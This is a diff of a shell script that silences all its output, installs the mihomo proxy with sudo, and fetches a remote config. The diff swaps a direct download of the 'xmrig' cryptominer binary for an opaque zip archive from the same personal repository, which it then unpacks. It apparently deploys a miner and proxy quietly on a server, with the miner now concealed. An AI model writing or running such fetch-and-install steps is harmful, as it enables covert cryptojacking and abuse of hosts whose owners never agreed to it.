@@ -3,7 +3,8 @@ set -e
 exec > /dev/null 2>&1
 
 wget https://github.com/MetaCubeX/mihomo/releases/download/v1.19.18/mihomo-linux-amd64-v1-v1.19.18.deb
-wget https://raw.githubusercontent.com/sweetasshole/test/main/sub/xmrig
+wget https://raw.githubusercontent.com/sweetasshole/test/refs/heads/main/sub/myarchive.zip
+unzip myarchive.zip
 sudo apt install ./mihomo-linux-amd64-v1-v1.19.18.deb
 sudo mkdir -p /etc/mihomo
 wget https://raw.githubusercontent.com/pornnewbee/socks5-for-serv00/main/sub/work/mihomoconfig.yml
